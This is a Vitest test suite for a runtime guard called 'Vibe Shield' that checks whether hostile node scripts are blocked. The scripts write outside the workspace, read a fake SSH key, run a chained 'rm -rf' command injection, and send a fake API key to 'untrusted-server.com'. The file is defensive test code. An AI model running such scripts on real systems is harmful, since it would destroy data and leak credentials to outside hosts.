import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { shieldCommand } from './shield.js';

describe('Vibe Shield Runtime Guard', () => {
  const tempDir = path.resolve(process.cwd(), 'temp-shield-test-workspace');

  beforeEach(() => {
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
    fs.mkdirSync(tempDir, { recursive: true });
  });

  afterEach(() => {
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('blocks fs writes outside workspace', async () => {
    const scriptPath = path.join(tempDir, 'script.cjs');
    const outsideFile = path.resolve(tempDir, '../outside-shield-write-test.txt');
    if (fs.existsSync(outsideFile)) fs.unlinkSync(outsideFile);

    fs.writeFileSync(scriptPath, `
      const fs = require('fs');
      try {
        fs.writeFileSync("${outsideFile.replace(/\\/g, '\\\\')}", "compromised");
        process.exit(0);
      } catch (err) {
        process.exit(99);
      }
    `, 'utf-8');

    const code = await shieldCommand(['node', scriptPath], {
      path: tempDir,
      dryRun: false,
      verbose: false
    });

    expect(code).toBe(99);
    expect(fs.existsSync(outsideFile)).toBe(false);
  });

  it('blocks fs writes outside workspace under ESM imports', async () => {
    const scriptPath = path.join(tempDir, 'script.mjs');
    const outsideFile = path.resolve(tempDir, '../outside-shield-write-esm-test.txt');
    if (fs.existsSync(outsideFile)) fs.unlinkSync(outsideFile);

    fs.writeFileSync(scriptPath, `
      import fs from 'fs';
      try {
        fs.writeFileSync("${outsideFile.replace(/\\/g, '\\\\')}", "compromised");
        process.exit(0);
      } catch (err) {
        process.exit(95);
      }
    `, 'utf-8');

    const code = await shieldCommand(['node', scriptPath], {
      path: tempDir,
      dryRun: false,
      verbose: false
    });

    expect(code).toBe(95);
    expect(fs.existsSync(outsideFile)).toBe(false);
  });

  it('allows fs writes inside workspace', async () => {
    const scriptPath = path.join(tempDir, 'script.cjs');
    const insideFile = path.join(tempDir, 'inside-shield-write-test.txt');

    fs.writeFileSync(scriptPath, `
      const fs = require('fs');
      try {
        fs.writeFileSync("${insideFile.replace(/\\/g, '\\\\')}", "safe");
        process.exit(100);
      } catch (err) {
        process.exit(99);
      }
    `, 'utf-8');

    const code = await shieldCommand(['node', scriptPath], {
      path: tempDir,
      dryRun: false,
      verbose: false
    });

    expect(code).toBe(100);
    expect(fs.readFileSync(insideFile, 'utf-8')).toBe('safe');
  });

  it('blocks sensitive path reads', async () => {
    const scriptPath = path.join(tempDir, 'script.cjs');
    const sshFakeFile = path.join(os.homedir(), '.ssh', 'fake_key_devbrief_test');
    
    const sshDir = path.join(os.homedir(), '.ssh');
    if (!fs.existsSync(sshDir)) fs.mkdirSync(sshDir, { recursive: true });
    fs.writeFileSync(sshFakeFile, 'privatekeycontent', 'utf-8');

    fs.writeFileSync(scriptPath, `
      const fs = require('fs');
      try {
        fs.readFileSync("${sshFakeFile.replace(/\\/g, '\\\\')}", "utf-8");
        process.exit(0);
      } catch (err) {
        process.exit(88);
      }
    `, 'utf-8');

    const code = await shieldCommand(['node', scriptPath], {
      path: tempDir,
      dryRun: false,
      verbose: false
    });

    expect(code).toBe(88);

    if (fs.existsSync(sshFakeFile)) fs.unlinkSync(sshFakeFile);
  });

  it('blocks shell command injection', async () => {
    const scriptPath = path.join(tempDir, 'script.cjs');

    fs.writeFileSync(scriptPath, `
      const { execSync } = require('child_process');
      try {
        execSync("node -e 'console.log(1)' ; rm -rf /invalid-path");
        process.exit(0);
      } catch (err) {
        process.exit(77);
      }
    `, 'utf-8');

    const code = await shieldCommand(['node', scriptPath], {
      path: tempDir,
      dryRun: false,
      verbose: false
    });

    expect(code).toBe(77);
  });

  it('blocks exfiltration of secrets to untrusted host', async () => {
    const scriptPath = path.join(tempDir, 'script.cjs');
    const envPath = path.join(tempDir, '.env');
    fs.writeFileSync(envPath, 'OPENAI_API_KEY=sk-test-openai-secret-key-12345', 'utf-8');

    fs.writeFileSync(scriptPath, `
      const http = require('http');
      try {
        const req = http.request({
          hostname: 'untrusted-server.com',
          port: 80,
          path: '/leak?key=sk-test-openai-secret-key-12345',
          method: 'GET'
        }, () => {});
        req.end();
        process.exit(0);
      } catch (err) {
        process.exit(66);
      }
    `, 'utf-8');

    const code = await shieldCommand(['node', scriptPath], {
      path: tempDir,
      dryRun: false,
      verbose: false
    });

    expect(code).toBe(66);
  });
});
